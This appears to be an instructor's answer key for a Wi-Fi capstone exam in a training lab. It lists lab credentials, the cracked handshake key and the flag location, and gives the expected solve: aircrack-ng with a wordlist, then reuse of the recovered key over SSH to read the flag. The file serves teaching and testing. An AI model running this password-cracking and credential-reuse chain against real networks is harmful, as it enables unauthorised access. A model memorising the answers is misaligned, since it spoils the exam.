# Coach context — wifi-t1-exam

## Ground truth
- `wifilab01` 10.x.10.25 — `wifi`/`WifiLab-24!`.
- `/opt/wifi/exam-handshake.cap` — REAL handshake, SSID `backup-wifi`,
  PSK `winter2024` (generated live via hwsim, verified with aircrack).
- `/opt/wifi/site-survey.txt` lists backup-wifi among authorized nets.
- `/opt/wifi/wordlist.txt` contains winter2024.
- `backup-admin` password = `winter2024`; flag `/home/backup-admin/flag.txt`.
- Command flag: `/home/wifi/analysis.txt` greps `backup-wifi` + `winter2024`.

## Expected solve
```bash
ssh wifi@10.x.10.25
cat /opt/wifi/site-survey.txt          # backup-wifi is authorized
aircrack-ng -w /opt/wifi/wordlist.txt /opt/wifi/exam-handshake.cap
# → KEY FOUND! winter2024
printf 'network: backup-wifi\nrecovered-key: winter2024\n' > /home/wifi/analysis.txt
sshpass -p winter2024 ssh backup-admin@localhost 'cat ~/flag.txt'
```

## Coach guidance
- Same chain as the teaching quest — differentiate by reporting rigor:
  the grader wants BOTH SSID and key in analysis.txt.
- Don't over-hint: this is the capstone, observe more than tier 1.
- Stumbles: writing only the key (misses `backup-wifi` grep), or analysis
  in wrong home dir.
